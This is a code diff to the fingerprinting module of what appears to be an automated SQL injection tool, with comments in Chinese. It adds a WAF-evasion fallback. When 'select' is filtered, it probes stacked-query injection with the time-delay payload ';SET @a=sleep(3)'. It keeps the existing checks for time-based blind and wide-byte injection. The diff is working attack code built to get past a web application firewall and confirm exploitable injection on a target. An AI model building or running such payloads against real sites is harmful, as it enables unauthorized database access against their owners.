@@ -56,15 +56,20 @@ class Fingerprinter:
         else:
             notes.append("sleep 被过滤，时间盲注判定受限")
 
-        # 堆叠
-        if not waf.is_filtered(";") and not waf.is_filtered("select"):
-            core = apply_form(";select sleep(3)", self.inj.form)
-            r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
-            fp.stacked = r.elapsed_ms >= 2800 and not r.has_sql_error()
+        # 堆叠（select 被滤时用 SET @a=sleep 探测，绕开关键字依赖）
+        if not waf.is_filtered(";"):
+            if not waf.is_filtered("select"):
+                core = apply_form(";select sleep(3)", self.inj.form)
+                r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
+                fp.stacked = r.elapsed_ms >= 2800 and not r.has_sql_error()
+            if not fp.stacked and not waf.is_filtered("sleep"):
+                core = apply_form(";SET @a=sleep(3)", self.inj.form)
+                r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
+                fp.stacked = r.elapsed_ms >= 2800
             if fp.stacked:
                 notes.append("堆叠注入可用（mysqli_multi_query）")
         else:
-            notes.append("分号或 select 被过滤，堆叠判定受限")
+            notes.append("分号被过滤，堆叠判定受限")
 
         # 宽字节（引号被处理的场景才有意义）
         if waf.is_filtered("'"):
